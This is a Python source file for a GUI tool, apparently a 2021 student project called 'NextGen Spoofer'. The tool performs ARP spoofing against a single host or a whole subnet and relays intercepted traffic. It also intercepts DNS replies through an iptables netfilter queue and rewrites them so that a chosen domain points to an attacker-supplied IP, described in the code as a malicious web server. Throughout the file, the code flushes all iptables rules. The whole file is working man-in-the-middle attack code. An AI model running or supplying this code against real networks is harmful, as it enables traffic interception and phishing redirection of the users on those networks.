# coding=utf-8
#!/usr/bin/python
#------------------------------------- IMPORTS ------------------------------------------
import signal
import sys
import socket
import os
import time
import argparse

import tkinter as tk 
from tkinter import *
from tkinter import ttk

from scapy.all import *
from netfilterqueue import NetfilterQueue

from threading import *

from PIL import Image, ImageTk


# ------------------------------------- MAIN ---------------------------------------------
# --------------------------------- Global param -----------------------------------------
router_ip=conf.route.route("0.0.0.0")[2] 
iface1=conf.iface
x = sr1(ARP(pdst=router_ip), iface=iface1, timeout=2) 
router_mac=x.hwsrc

# Frame
class dreamteam(tk.Tk):
    def __init__(self):
        tk.Tk.__init__(self)
        self._frame = None
        self.switch_frame(mainwindow)
        self.label= Label(self, text="", bg="black")
        self.label.pack()
 
    def switch_frame(self, frame_class):
        new_frame = frame_class(self)
        if self._frame is not None:
            self._frame.destroy()
        self._frame = new_frame
        self._frame.pack()
 
class mainwindow(Frame):
    def __init__(self, master):
        Frame.__init__(self, master)
        self.window = ttk.Notebook()
        
        # TAB COLOR
        style = ttk.Style()
        white = "#ECC"
        red = "#ae3333"
        style.theme_create( "yummy", parent="alt", settings={
        "TNotebook": {"configure": {"tabmargins": [2, 5, 2, 0] } },
        "TNotebook.Tab": {
            "configure": {"padding": [15, 5], "background": white },
            "map":       {"background": [("selected", red)],
                          "expand": [("selected", [2, 4, 1, 1])] } } } )
        
        
        self.tab1 = Tab1(self.window)
        style.theme_use("yummy")
        self.DNS_attk = DNS_attk(self.window)
        self.about_nc = about_nc(self.window)
        arp=self.window.add(self.tab1, text="ARP Spoofer")
        dns=self.window.add(self.DNS_attk, text="DNS Spoofer")
        about=self.window.add(self.about_nc, text="About the project")
        self.window.pack()
        

        
    def switch_tab1(self, frame_class):
        new_frame = frame_class(self.window)
        self.tab1.destroy()
        self.tab1 = new_frame
        self.tab1.configure(bg='black')
         
class Tab1(Frame):
    def __init__(self, master):
        Frame.__init__(self, master)
        self._frame = None
        self.switch_frame(ARP_one)
 
    def switch_frame(self, frame_class):
        new_frame = frame_class(self)
        if self._frame is not None:
            self._frame.destroy()
        self._frame = new_frame
        self._frame.pack()
 
#--------------------------------------- ARP SPOOF 1 VICTIM ------------------------------------------

class ARP_one(Frame):
	def __init__(self, master):
        
        # Close application + restore network
		def signal_handler():
			canvas1.itemconfig("smile", image=img1)
			iface=self.saisie_if.get()
			victim_ip=self.saisie_vic.get()

			x = sr1(ARP(pdst=victim_ip), iface=iface, timeout=2) 
			victim_mac = x.hwsrc
			x = sr1(ARP(pdst=router_ip), iface=iface, timeout=2)
			router_mac = x.hwsrc

			self.text_box.insert("end-1c", "\n [!] Restoring the victim's network [!]\n")
			send(ARP(pdst=victim_ip, hwdst=victim_mac, psrc=router_ip, hwsrc=router_mac, op=2), count=5, inter=.2)
			os.system("iptables -F")
			app.destroy()
		
		# Call Signal handler - Stop program
		def threading2():
			t2=Thread(target=signal_handler)
			t2.start()           

		# Call single - ARP launch
		def threading1():
			t1=Thread(target=single)
			t1.start()
			
			# GUI VICTIMS
			canvas = self.canvas
			gui_pc = self.gui_pc
			victim_ip=self.saisie_vic.get()
			y = victim_ip
			iface=self.saisie_if.get()
			x = get_if_addr(iface)
			
			# Hacker PC 
			item=canvas.create_image((250, 50), anchor=CENTER, image=hacker_pc, tag="hacker_pc")
			canvas.itemconfig("hacker_pc", image=hacker_pc)
			text=canvas.create_text((250, 120), anchor=CENTER, text=x, tag="gui_ip", fill="red")
			canvas.itemconfig("gui_ip")
			
			# Victim PC
			item=canvas.create_image((550, 50), anchor=CENTER, image=gui_pc, tag="gui_vic")
			canvas.itemconfig("gui_vic", image=gui_pc)
			text=canvas.create_text((550, 120), anchor=CENTER, text=y, tag="gui_ip", fill="white")
			canvas.itemconfig("gui_ip")
			canvas.update()
			canvas.pack()
            
		def single():
			# Green light
			canvas1.itemconfig("smile", image=img2)
			#sniff(filter="arp and host " + router_ip, prn=arp_sniffing1)
			sniff(prn=general_sniffing1)
            
		def arp_spoof1():
			iface=self.saisie_if.get() # get interface 
			victim_ip=self.saisie_vic.get() # get victim ip
			self.victim_ip = victim_ip
			ethernet = Ether()
			arp = ARP(pdst=victim_ip, psrc=router_ip, op="is-at")
			arp1 = ARP(pdst=router_ip, psrc=victim_ip, op="is-at")
			packet = ethernet / arp
			packet1 = ethernet / arp1
			sendp(packet, iface=iface)
			sendp(packet1, iface=iface)
			self.text_box.insert("end-1c", "[+] ARP SPOOF VICTIM \n")
			self.text_box.insert("end-1c", "[+] ARP SPOOF ROUTER \n")
			
			self.spoof=canvas.create_line(320,45,480,45, arrow=tk.LAST, fill="green", width="7")
			time.sleep(2)
			canvas.delete(self.spoof)

		def arp_sniffing1(pkt):
			if pkt[ARP].op == 1:  # is-at (response)
				self.text_box.insert("end-1c","\n\n[i] Response : ( {0} ) MAC address : ( {1} )\n".format(pkt[ARP].hwsrc, pkt[ARP].psrc))
			arp_spoof1()
    
		def general_sniffing1(pkt):
			iface=self.saisie_if.get()
			victim_ip=self.saisie_vic.get()
			router_ip=conf.route.route("0.0.0.0")[2]
			x = sr1(ARP(pdst=router_ip), iface=iface, timeout=2)
			router_mac = x.hwsrc
			x = sr1(ARP(pdst=victim_ip), iface=iface, timeout=2) 
			victim_mac = x.hwsrc
			me_ip = get_if_addr(iface)
			me_mac = get_if_hwaddr(iface)
			if pkt.haslayer(ARP):
				if pkt.haslayer(Ether) and pkt[Ether].src != me_mac:# and pkt[ARP].op == 2:
					arp_sniffing1(pkt)
					
			elif pkt.haslayer(ICMP) and pkt.haslayer(Ether) and pkt.haslayer(IP):
				if pkt[IP].dst in (router_ip, victim_ip):
					if pkt[Ether].dst == me_mac:
						self.text_box.insert("end-1c","REDIRECTING ICMP\n")
						
						# ICMP ARROW
						self.arrow=canvas.create_line(480,45,320,45, arrow=tk.LAST, fill="purple", width="7")
						time.sleep(2)
						canvas.delete(self.arrow)
						
						#pkt.show()
						pkt[Ether].dst = victim_mac if pkt[IP].dst == victim_ip else router_mac
						pkt[Ether].src = me_mac
						sendp(pkt, iface=iface)
					
				else:
					# SELF EMITTED FIGURE
					self.text_box.insert("end-1c","PACKET SELF EMITTED\n")
					self.selfe=canvas.create_text(400,45, text="SELF EMITTED", font = ( "Calibri" , 15  ), fill="#99aaff")
					time.sleep(2)
					canvas.delete(self.selfe)
				   
			else:
				# NOT REDIRECTING CROSS
				self.text_box.insert("end-1c","NOT REDIRECTING\n")
				self.cross=canvas.create_text(400,45, text="X", font = ( "Calibri" , 30  ), fill="red")
				time.sleep(2)
				canvas.delete(self.cross)
            
            
		Frame.__init__(self, master)
		self.multiuser = Button(self, text="►All the network◄", command=lambda: master.switch_frame(ARP_all),bg='#ae3333', cursor="hand2")
		self.label_if = Label(self, text="ARP Spoofer | One Target", font = ( "Calibri" , 20 ), bg='#ae3333', pady=30, padx=128, width = 45)
		self.label_if.pack()
		self.label= Label(self, text="", bg="black")
		self.label.pack()

		# IFACE
		self.label_if = Label(self, text="INTERFACE", font = ( "Calibri" , 11, "bold" ), bg='#ae3333')
		self.label_if.pack()
		self.saisie_if = Entry(self, width=20, cursor="dotbox")
		self.saisie_if.pack()

		# SPACES
		self.label= Label(self, text="", bg="black")
		self.label.pack()

		# VICTIM IP
		self.label_vic = Label(self, text="TARGET @IP", font = ( "Calibri" , 11, "bold" ), bg='#ae3333')
		self.label_vic.pack()
		self.saisie_vic = Entry(self, width=20, cursor="dotbox")
		self.saisie_vic.pack()


		# SPACES
		self.label= Label(self, text="", bg="black")
		self.label.pack()
		self.label= Label(self, text="", bg="black")
		self.label.pack()
		
		start_btn = ImageTk.PhotoImage(Image.open("../images/start.png"))
		stop_btn = ImageTk.PhotoImage(Image.open("../images/stop.png"))
		

		# TEXT BOX DETAILS
		self.dt = Label(self, text="Details", font = ( "Calibri" , 11, "italic" ), bg='#ae3333')
		self.dt.pack()
		self.text_box = tk.Text(self, width = 40, height = 7, cursor="pirate")
		self.text_box.pack()

		self.label= Label(self, text="", bg="black")
		self.label.pack()

		# BUTTONS AND OTHERS

		self.b_start=Button(self, image=start_btn, cursor="hand2", command = threading1)
		self.b_stop=Button(self, image=stop_btn, cursor="hand2", command=threading2) 
		self.b_start.image=start_btn
		self.b_stop.image=stop_btn
		self.b_start.pack()
		self.label= Label(self, text="", bg="black")
		self.label.pack()
		self.b_stop.pack()

		# SPACES
		self.label= Label(self, text="", bg="black")
		self.label.pack()
		self.multiuser.pack()

		# LIGHTS
		img2 = ImageTk.PhotoImage(Image.open("../images/green.png"))
		img1 = ImageTk.PhotoImage(Image.open("../images/red.png"))

		canvas1 = tk.Canvas(self, width=100, height=100, bg="black", highlightthickness=0)
		canvas1.pack()
		canvas1.create_image((50, 50), image=img1, tag="smile")
        
		# GUI VICTIM
		gui_pc = ImageTk.PhotoImage(Image.open("../images/victim.png"))
		hacker_pc = ImageTk.PhotoImage(Image.open("../images/hacker.png"))

		# SPACES 
		self.label= Label(self, text="", bg="black")
		self.label.pack()
       
		canvas = tk.Canvas(self, width=800, height=200, bg="black", highlightthickness=0)
		self.gui_pc = gui_pc
		self.hacker_pc = hacker_pc
		self.canvas = canvas
		self.configure(bg="black")
		self.label= Label(self, text="", bg="black")
		self.label.pack()
		
		
#--------------------------------------------- ARP SPOOF ALL ---------------------------------------------

class ARP_all(Frame):
	def __init__(self, master):
		
        	# Close application + restore network
		def signal_handler_all():
			canvas1.itemconfig("smile", image=img1)
			#victim_ip=self.saisie_ip.get()
			# send to the broadcast
			victim="255.255.255.255"

			x = sr1(ARP(pdst=router_ip), iface=iface1, timeout=2)
			router_mac = x.hwsrc
			app.destroy()
			send(ARP(pdst=victim, psrc=router_ip, hwsrc=router_mac, op=2), count=5, inter=.2)
			os.system("iptables -F")
			
			
		# ARP all launch
		def threading2():
			t1=Thread(target=arp_all)
			t1.start()
			
		def arp_sniffing2(pkt):
			if pkt[ARP].op == 1:  # is-at (response)
				#print('\n\n[i] Response : ( {0} ) MAC address : ( {1} )'.format(pkt[ARP].hwsrc, pkt[ARP].psrc))
				arp_spoof2()
		
		def arp_all():
			sniff(filter="arp and host "+router_ip, prn=arp_sniffing2)
			
		def arp_spoof2(): 
			# Green light
			canvas1.itemconfig("smile", image=img2)
			victim_ip=self.saisie_ip.get()
			
			# Create ARP packet
			arp = ARP(pdst=victim_ip)
			
			# Create Broadcast Ether ether
			# ff:ff:ff:ff:ff:ff is broadcast (MAC addr)
			ether = Ether(dst="ff:ff:ff:ff:ff:ff")
			
			packet = ether/arp
			result = srp(packet, timeout=3, verbose=0)[0]
			
			# make a list of victims
			victims = []
			gui_victims = []
			# Get all IP and MAC address of the network + spoof them
			for sent, received in result:
			# For each answer, we add IP and MAC address to `victims` and 'gui_victims' lists
				victims.append({'ip': received.psrc, 'mac': received.hwsrc})
				gui_victims.append(received.psrc)
				
			# Display all network victims
			self.text_box.insert("end-1c", "\nCONNECTED MACHINES\n")
			self.text_box.insert("end-1c", "IP" + " "*18+"MAC\n")
			for x in victims:
				self.text_box.insert("end-1c", "{:16}    {}\n".format(x['ip'], x['mac']))
				
			# GUI VICTIMS ANIMATION
			a = 110
			b = 110
			
			canvas = self.canvas
			gui_pc = self.gui_pc
			
			for i in self.items:
				canvas.delete(i)
			for t in self.texts:
				canvas.delete(t)
			
			self.items = []
			self.texts = []

			for y in gui_victims:
				print (y)
				if y == router_ip:
					item=canvas.create_image((10, 10), anchor=NW, image=router, tag="router")
					canvas.itemconfig("router", image=router)
					text=canvas.create_text((10, 65), anchor=NW, font=("Calibri", 7), text=y, tag="router_ip", fill="red")
					canvas.itemconfig("router_ip")
					self.items.append(item)
					self.texts.append(text)
				else:
					item=canvas.create_image((a, 10), anchor=NW, image=gui_pc, tag="gui_vic")
					canvas.itemconfig("gui_vic", image=gui_pc)
					text=canvas.create_text((b, 65), anchor=NW, font=("Calibri", 7), text=y, tag="gui_ip", fill="red")
					canvas.itemconfig("gui_ip")
					self.items.append(item)
					self.texts.append(text)
					a += 100
					b += 100

				text=0
				item=0
				
				
			time.sleep(1)
			canvas.update()
			canvas.pack()
				
			ethernet = Ether()
			a-=75
			for x in victims:
				if x['ip']==router_ip: # Deleting router IP address because we don't want to send it any ARP packet
					del x['ip']
				else:
					arp = ARP(pdst=x['ip'], psrc=router_ip, op="is-at")
					packet = ethernet / arp
					sendp(packet, iface=iface1) 
					self.text_box.insert("end-1c","[+] ARP Spoof to ( {0} )\n".format(x['ip']))
					self.arrow=canvas.create_line(a,130,a,80, arrow=tk.LAST, fill="yellow", width="5")
					time.sleep(0.4)
					canvas.delete(self.arrow)
					a-=100
					
					
  
		Frame.__init__(self, master)
		
		self.items = []
		self.texts = []
		self.singleuser = Button(self, text="►Single user◄", command=lambda: master.switch_frame(ARP_one), bg="#ae3333", cursor="hand2")
		self.label_if = Label(self, text="ARP Spoofer | All Network", font = ( "Calibri" , 20 ), bg='#ae3333', pady=30, padx=128, width=45)
		self.label_if.pack()
		
		# SPACES
		self.label= Label(self, text="", bg="black")
		self.label.pack()
		self.label= Label(self, text="", bg="black")
		self.label.pack()
		
		# IFACE
		self.label_ip = Label(self, text="NETWORK @IP", font = ( "Calibri" , 11, "bold" ), bg='#ae3333')
		self.label_ip.pack()
		self.saisie_ip = Entry(self, width=20, cursor="dotbox")
		self.saisie_ip.pack()
		self.example = Label(self, text="(EX : 192.168.1.0/24)", font = ( "Calibri" , 7, "italic"), bg='#ae3333')
		self.example.pack()
		
		# SPACES
		self.label= Label(self, text="", bg="black")
		self.label.pack()
		self.label= Label(self, text="", bg="black")
		self.label.pack()
		
		# TEXTBOX DETAILS
		self.dt = Label(self, text="Details", font = ( "Calibri" , 11, "italic"), bg='#ae3333')
		self.dt.pack()
		self.text_box = tk.Text(self, width = 40, height = 7, cursor="pirate")
		self.text_box.pack()
		
		# SPACES
		self.label= Label(self, text="", bg="black")
		self.label.pack()
		
		start_btn = ImageTk.PhotoImage(Image.open("../images/start.png"))
		stop_btn = ImageTk.PhotoImage(Image.open("../images/stop.png"))
		
		# BUTTONS
		self.b_start2=Button(self, image=start_btn, cursor="hand2", command = threading2)
		self.b_stop2=Button(self, image=stop_btn, cursor="hand2", command=signal_handler_all) 
		self.b_start2.image=start_btn
		self.b_stop2.image=stop_btn
		self.b_start2.pack()
		self.label= Label(self, text="", bg="black")
		self.label.pack()
		self.b_stop2.pack()
		
		# SPACES
		self.label= Label(self, text="", bg="black")
		self.label.pack()
		self.singleuser.pack()

		# LIGHTS
		img1 = ImageTk.PhotoImage(Image.open("../images/red.png"))
		img2 = ImageTk.PhotoImage(Image.open("../images/green.png"))
		canvas1 = tk.Canvas(self, width=100, height=100, bg="black", highlightthickness=0)
		canvas1.pack()
		canvas1.create_image((50, 50), image=img1, tag="smile")
		self.configure(bg="black")
		
		self.anim = Label(self, text="|CONNECTED DEVICES|", font = ( "Calibri" , 12 ), bg='#ae3333', width = 50)
		self.anim.pack()
		self.label= Label(self, text="", bg="black")
		self.label.pack()
		# GUI VICTIM
		gui_pc = ImageTk.PhotoImage(Image.open("../images/victim2.png"))
		router = ImageTk.PhotoImage(Image.open("../images/router.png"))
		spoof = ImageTk.PhotoImage(Image.open("../images/spoof.png"))
		canvas = tk.Canvas(self, width=900, height=200, bg="black", highlightthickness=0)
		self.gui_pc = gui_pc
		self.canvas = canvas

		
#--------------------------------------------- DNS SPOOF ---------------------------------------------

class DNS_attk(Frame):
	def __init__(self, master):
		
		# Launch DNS SPOOF
		def threading_dns():
			t1=Thread(target=dns_spoof)
			t1.start()

			# HACKER PC
			item=canvas.create_image((250, 50), anchor=CENTER, image=hacker_pc, tag="hacker_pc")
			canvas.itemconfig("hacker_pc", image=hacker_pc)

			# VICTIM PC
			item=canvas.create_image((550, 50), anchor=CENTER, image=gui_pc, tag="gui_vic")
			canvas.itemconfig("gui_vic", image=gui_pc)

			canvas.update()
			canvas.pack()
            
		def modify_packet(packet):
			"""
			Modifies the DNS Resource Record `packet`
			to map our globally defined `dns_hosts` dictionary.
			I.E, whenever we see a google.com answer, this function replaces 
			the real IP address (172.217.19.142) with fake IP address (your malicious web server ip)
			"""
			# GET INPUT DNS NAME AND IP
			x = self.saisie_dnsname.get()
			y = self.saisie_dnsip.get()

			dns_hosts = {b"{0}.".format(x): "{0}".format(y)}

			# get the DNS question name, the domain name
			qname = packet[DNSQR].qname

			if qname not in dns_hosts:
			# if the website isn't in our record -> no modif
				self.text_box.insert("end-1c", "NO MODIF: {0} \n".format(qname))
				return packet

			# craft new answer, overriding the original
			# setting the rdata for the IP we want to redirect (spoofed)
			# for instance, google.com will be mapped to "192.168.40.113"
			x = qname
			self.dnsreqtxt=canvas.create_text((400, 75), anchor=NW, text=x, tag="gui_ip", fill="#99aaff")
			self.dnsreq=canvas.create_line(480,30,320,30, arrow=tk.LAST, fill="#99aaff", width="7")
			time.sleep(0.5)
			canvas.delete(self.dnsreq)
			canvas.delete(self.dnsreqtxt)

			packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])

			# set the answer count to 1
			packet[DNS].ancount = 1
			# delete checksums and length of packet, because we have modified the packet
			# new calculations are required (scapy will do automatically)
			del packet[IP].len
			del packet[IP].chksum
			del packet[UDP].len
			del packet[UDP].chksum

			# return the modified packet
			return packet

		def process_packet(packet):
			self.text_box.insert("end-1c", "MODIFYING\n")

			'''Whenever a new packet is redirected to the netfilter queue,
			this callback is called.'''

			# convert netfilter queue packet to scapy packet
			scapy_packet = IP(packet.get_payload())
			if scapy_packet.haslayer(DNSRR):
				# if the packet is a DNS Resource Record (DNS reply) -> MODIF 
				self.text_box.insert("end-1c", "[Before]: {0} \n".format(scapy_packet.summary()))
				#y = scapy_packet.summary()
				try:
					scapy_packet = modify_packet(scapy_packet)
				except IndexError:
					# not UDP packet, this can be IPerror/UDPerror packets
					pass
				self.text_box.insert("end-1c", "[After ]: {0}\n ".format(scapy_packet.summary()))
				z = scapy_packet.summary()
		# set back as netfilter queue packet
				packet.set_payload(bytes(scapy_packet))


			packet.accept()
			self.dnsfakaddrtxt=canvas.create_text((290, 85), anchor=NW, text=z, tag="gui_ip", fill="red")
			self.dnsfakaddr=canvas.create_line(320,55,480,55, arrow=tk.LAST, fill="red", width="7")
			time.sleep(1)
			canvas.delete(self.dnsfakaddr)
			canvas.delete(self.dnsfakaddrtxt)
			# DNS GUI RED ( after IP Addr )


		def dns_spoof():
			QUEUE_NUM = 0
			# insert the iptables FORWARD rule
			os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
			# instantiate the netfilter queue
			queue = NetfilterQueue()
			queue.bind(QUEUE_NUM, process_packet)
			nfqueue_check=os.popen('iptables -S').readlines()
			for i in nfqueue_check:
				if "NFQUEUE" in i:
					canvas1.itemconfig("smile", image=img2)
			queue.run()

		def dns_kill():
			#IMPORTANT !!
			os.system("iptables -F")
			queue = NetfilterQueue()
			queue.unbind()
			self.text_box.insert("end-1c", "yo mama is so fat, she outweighted this application \n")

			# RED LIGHT
			canvas1.itemconfig("smile", image=img1)

		Frame.__init__(self, master)

		self.label_if = Label(self, text="DNS Spoofer", font = ( "Calibri" , 20  ), bg='#16537e', pady=30, padx=128, width = 45)
		self.label_if.pack()
		self.label_att= Label(self, text="⚠️ Please use DNS Spoof AFTER starting ARP Spoof ⚠️", bg="#16537e")
		# SPACES
		self.label= Label(self, text="", bg="black")
		self.label.pack()
		self.label= Label(self, text="", bg="black")
		self.label.pack()

		# DNS NAME INPUT
		self.label_dnsname = Label(self, text="DNS NAME", font = ( "Calibri" , 11, "bold" ), bg='#16537e')
		self.label_dnsname.pack()
		self.saisie_dnsname = Entry(self, width=20, cursor="dotbox")
		self.saisie_dnsname.pack()

		# SPACES
		self.label= Label(self, text="", bg="black")
		self.label.pack()

		# DNS IP INPUT
		self.label_dnsip = Label(self, text="DNS @IP ", font = ( "Calibri" , 11, "bold"), bg='#16537e')
		self.label_dnsip.pack()
		self.saisie_dnsip = Entry(self, width=20, cursor="dotbox")
		self.saisie_dnsip.pack()

		# SPACES
		self.label= Label(self, text="", bg="black")
		self.label.pack()
		self.label= Label(self, text="", bg="black")
		self.label.pack()

		# TEXTBOX DETAILS
		self.dt = Label(self, text="Details", font = ( "Calibri" , 11 , "italic"), bg='#16537e')
		self.dt.pack()
		self.text_box = tk.Text(self, width = 40, height = 7, cursor="pirate")
		self.text_box.pack()

		# SPACES
		self.label= Label(self, text="", bg="black")
		self.label.pack()
		self.label_att.pack()
		self.label= Label(self, text="", bg="black")
		self.label.pack()

		# BUTTONS
		self.b_start2 = Button(self, text="Start", bg = "green" , fg = "black" , cursor="hand2", command = threading_dns )
		self.b_stop2=Button(self, text="Stop", bg = "red" , fg = "black" , cursor="hand2", command = dns_kill)
		self.b_start2.pack()

		# SPACES
		self.label= Label(self, text="", bg="black")
		self.label.pack()

		self.b_stop2.pack()

		self.label= Label(self, text="", bg="black")
		self.label.pack()

		# IMAGES AND CANVAS1
		img1 = ImageTk.PhotoImage(Image.open("../images/red.png"))
		img2 = ImageTk.PhotoImage(Image.open("../images/green.png"))
		canvas1 = tk.Canvas(self, width=100, height=100, bg="black", highlightthickness=0)
		canvas1.pack()
		canvas1.create_image((50, 50), image=img1, tag="smile")

		# SPACES
		self.configure(bg="black")

		# GUI VICTIM
		gui_pc = ImageTk.PhotoImage(Image.open("../images/victim.png"))
		hacker_pc = ImageTk.PhotoImage(Image.open("../images/hacker.png"))
		canvas = tk.Canvas(self, width=800, height=200, bg="black", highlightthickness=0)
		self.gui_pc = gui_pc
		self.hacker_pc = hacker_pc
		self.canvas = canvas

#--------------------------------------------- ABOUT THE PROJECT ---------------------------------------------

class about_nc(Frame):
	def __init__(self, master):
		       
		Frame.__init__(self, master)

		self.label_if = Label(self, text="About", font = ( "Calibri" , 20 ), width = 45, bg='#ae3333', pady=30, padx=128)
		self.label_if.pack()

		# SPACES
		self.label= Label(self, text="", bg="black")
		self.label.pack()

		self.canvas_a = tk.Canvas(self, width=160, height=160, bg="black", highlightthickness=0)
		self.canvas_a.pack()
		self.logo = ImageTk.PhotoImage(Image.open('../images/logo.png'))
		self.canvas_a.create_image(150,150,image=self.logo,anchor='se') 

		# SPACES
		self.label= Label(self, text="", bg="black")
		self.label.pack()

		# HELP text
		self.dt = Label(self, text="HELP", font = ( "Calibri" , 12, "bold" ), bg='#ae3333')
		self.dt.pack()

		# SPACES 
		self.label= Label(self, text="", bg="black")
		self.label.pack()

		self.dt = Label(self, text="                ARP SPOOF                ", font = ( "Calibri" , 12 ), bg='white')
		self.dt.pack()
		self.label= Label(self, text="", bg="black")
		self.label.pack()

		self.canvas_a = tk.Canvas(self, width=400, height=230, bg="black", highlightthickness=0)
		self.canvas_a.pack()

		# SPOOF ARROW
		self.spoof=self.canvas_a.create_text(100,35, text="Spoofing", font = ( "Calibri" , 9  ), fill="green")
		self.spoof=self.canvas_a.create_line(50,20,170,20, arrow=tk.LAST, fill="green", width="7")

		# ICMP ARROW
		self.icmp=self.canvas_a.create_text(300,35, text="Redirecting ICMP", font = ( "Calibri" , 9  ), fill="purple")
		self.arrow=self.canvas_a.create_line(355,20,235,20, arrow=tk.LAST, fill="purple", width="7")

		# CROSS
		self.icmp=self.canvas_a.create_text(200,90, text="Not redirecting", font = ( "Calibri" , 9  ), fill="red")
		self.cross=self.canvas_a.create_text(200,60, text="X", font = ( "Calibri" , 30  ), fill="red")
		
		self.all=self.canvas_a.create_text(200,120, text="ARP ALL Network", font = ( "Calibri" , 11, "bold"  ), fill="white")
		self.arp=self.canvas_a.create_text(200,220, text="Spoofing", font = ( "Calibri" , 9  ), fill="yellow")
		self.arrow=self.canvas_a.create_line(200,200,200,140, arrow=tk.LAST, fill="yellow", width="5")
		
		self.label= Label(self, text="", bg="black")
		self.label.pack()
		self.label= Label(self, text="", bg="black")
		self.label.pack()
		self.dt = Label(self, text="                DNS SPOOF                ", font = ( "Calibri" , 12 ), bg='white')
		self.dt.pack()
		self.label= Label(self, text="", bg="black")
		self.label.pack()

		self.canvas_b = tk.Canvas(self, width=400, height=100, bg="black", highlightthickness=0)
		self.canvas_b.pack()

		# SPOOF ARROW
		self.dns=self.canvas_b.create_text(100,35, text="DNS Response from hacker", font = ( "Calibri" , 9  ), fill="red")
		self.dns=self.canvas_b.create_line(50,20,170,20, arrow=tk.LAST, fill="red", width="7")

		# ICMP ARROW
		self.icmp=self.canvas_b.create_text(300,35, text="DNS Request (client)", font = ( "Calibri" , 9  ), fill="#99aaff")
		self.arrow=self.canvas_b.create_line(355,20,235,20, arrow=tk.LAST, fill="#99aaff", width="7")


		self.dt = Label(self, text="Copyright ( © ) 2021 KL \n This program comes with ABSOLUTELY NO WARRANTY ! \n It is a free software, and you are welcome to redistribute it under certain conditions. ", font = ( "Calibri" , 10 ), bg='#ae3333')
		self.dt.pack()

		self.configure(bg="black")
		

        
if __name__ == "__main__":
	app = dreamteam()
	app.title("NextGen Spoofer")
	app.configure(bg='black')
	app.mainloop()
	
